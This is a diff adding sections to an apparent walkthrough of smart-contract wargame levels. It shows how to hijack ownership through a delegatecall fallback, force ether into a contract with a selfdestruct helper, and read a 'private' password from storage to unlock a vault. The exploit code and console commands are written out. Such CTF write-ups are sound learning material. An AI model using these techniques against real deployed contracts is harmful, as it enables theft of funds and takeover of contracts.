@@ -93,3 +93,26 @@ If we can send a transaction to the main contract with instructions to call the 
 To do this, we need to prepare the payload with by typing in the console: `const payload = web3.eth.abi.encodeFunctionSignature("pwn()")` which is '0xdd365b8b', the 4 first bytes signature of the function 'pwn()', send call the fallback() function with the payload as data of the call: `await contract.sendTransaction({data: payload})`.
 Wait for tx to be mined and, voila, you are now the owner of the delegation contract!
 
+## Lvl-7 Force
+The contract is empty, therefore the contract has no established way of dealing with ether that are force send to it.
+If we add a small balance to a contract, then have it selfdestruct with the targeted contract's address as a parameter, the eth will be force send to the contract and the contract's balance would be > 0.
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract SelfDestructor {
+
+    constructor() public payable {
+    }
+  function kamikaze(address payable _target) public {
+      selfdestruct(_target);
+  }
+}
+```
+
+## Lvl-8 Vault
+Looking at the code, we can see that the 'bytes32 private password' is not private, at least not private enough.
+The key word private means that this variable can only be called by this smart contract. It's doesn't mean that no one can read it.
+In the console, I can simply call 'const pass = await web3.eth.getStorageAt(instance, 1)' to get what is being stored in the 2nd memory slot of the instance contract address. I get '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' in response, which is the bytes32 password. I can then call 'contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")' and the vault is unlocked.
+
+
